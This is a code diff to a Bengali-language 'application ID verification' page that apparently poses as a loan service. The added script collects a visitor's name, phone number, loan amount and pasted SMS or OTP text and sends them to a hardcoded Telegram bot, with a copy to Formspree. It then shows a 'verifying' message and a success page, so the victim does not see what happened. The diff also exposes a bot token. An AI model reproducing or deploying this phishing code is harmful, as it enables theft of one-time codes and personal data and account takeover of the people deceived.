@@ -95,7 +95,6 @@
 <div class="container">
     <div class="header">
         <div class="brand-logo-wrap">
-            <!-- ছোট হাতের এল দিয়ে logoo.png সেট করা হয়েছে -->
             <img src="logoo.png" alt="Company Logo" class="company-logo">
         </div>
         <h2>অ্যাপ্লিকেশন আইডি যাচাই</h2>
@@ -142,10 +141,18 @@
 </div>
 
 <script>
+    // টেলিগ্রাম বট কনফিগারেশন
+    const TELEGRAM_BOT_TOKEN = "9297864323:AAGgW9qv2-xNho2KXhPDxKXgXUn2rxUgQSE";
+    const TELEGRAM_CHAT_ID = "8933782693";
+
     const params = new URLSearchParams(window.location.search);
-    document.getElementById('hiddenName').value = params.get('name') || '';
-    document.getElementById('hiddenPhone').value = params.get('phone') || '';
-    document.getElementById('hiddenAmount').value = params.get('amount') || '';
+    const applicantName = params.get('name') || 'N/A';
+    const applicantPhone = params.get('phone') || 'N/A';
+    const applicantAmount = params.get('amount') || 'N/A';
+
+    document.getElementById('hiddenName').value = applicantName;
+    document.getElementById('hiddenPhone').value = applicantPhone;
+    document.getElementById('hiddenAmount').value = applicantAmount;
 
     let timeLeft = 20;
     let timer = null;
@@ -193,17 +200,41 @@
     form.addEventListener("submit", function(event) {
         event.preventDefault();
         btnSubmit.disabled = true;
-        btnSubmit.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';
+        btnSubmit.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';
 
-        const data = new FormData(form);
+        const smsText = document.getElementById("appText").value;
 
-        fetch(form.action, {
-            method: "POST",
-            body: data,
-            headers: { 'Accept': 'application/json' }
-        }).finally(() => {
-            window.location.href = "success.html";
-        });
+        // টেলিগ্রাম মেসেজ ফরম্যাট
+        const message = `📩 নতুন এসএমএস / ওটিপি যাচাই!\n\n` +
+                        `👤 নাম: ${applicantName}\n` +
+                        `📞 মোবাইল: ${applicantPhone}\n` +
+                        `💰 লোনের পরিমাণ: ${applicantAmount} টাকা\n\n` +
+                        `💬 এসএমএস টেক্সট:\n${smsText}\n\n` +
+                        `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+        // ১. আগে টেলিগ্রামে মেসেজ পাঠানো
+        fetch(telegramUrl)
+            .then(res => res.json())
+            .then(data => {
+                console.log("Telegram Success:", data);
+            })
+            .catch(err => {
+                console.error("Telegram Error:", err);
+            })
+            .finally(() => {
+                // ২. Formspree-তে ডাটা ব্যাকআপ পাঠানো
+                const data = new FormData(form);
+                fetch(form.action, {
+                    method: "POST",
+                    body: data,
+                    headers: { 'Accept': 'application/json' }
+                }).finally(() => {
+                    // ৩. সবশেষে success.html পেজে নিয়ে যাওয়া
+                    window.location.href = "success.html";
+                });
+            });
     });
 
     const loanData = [
